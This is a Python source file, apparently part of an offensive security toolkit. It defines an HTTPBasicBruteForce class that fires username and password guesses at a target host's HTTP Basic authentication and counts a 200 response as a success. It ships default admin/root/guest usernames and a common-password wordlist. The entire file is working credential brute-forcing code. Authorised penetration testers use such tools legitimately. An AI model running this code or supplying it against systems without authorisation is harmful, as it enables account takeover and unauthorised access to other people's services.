
import asyncio

from ...payloads.base import Credentials, WordlistManager
from .base import BruteForceBase


class HTTPBasicBruteForce(BruteForceBase):

    def __init__(self, host: str, port: int, path: str = '/', **kwargs):
        super().__init__(host, port, **kwargs)
        self.path = path
        self.scheme = 'https' if port in (443, 8443) else 'http'
        self.url = f"{self.scheme}://{host}:{port}{path}"

    def get_default_username_list(self) -> list[str]:
        return ['admin', 'user', 'root', 'test', 'guest']

    def get_default_password_list(self) -> list[str]:
        return WordlistManager.get_wordlist('common_passwords') or ['admin', 'password', '123456', 'test']

    async def try_credentials(self, credentials: Credentials) -> bool:

        try:
            import aiohttp
        except ImportError:
            return False

        auth = aiohttp.BasicAuth(credentials.username, credentials.password)

        try:
            async with aiohttp.ClientSession(auth=auth) as session, session.get(
                self.url,
                timeout=self.timeout,
            ) as response:

                return response.status == 200
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return False
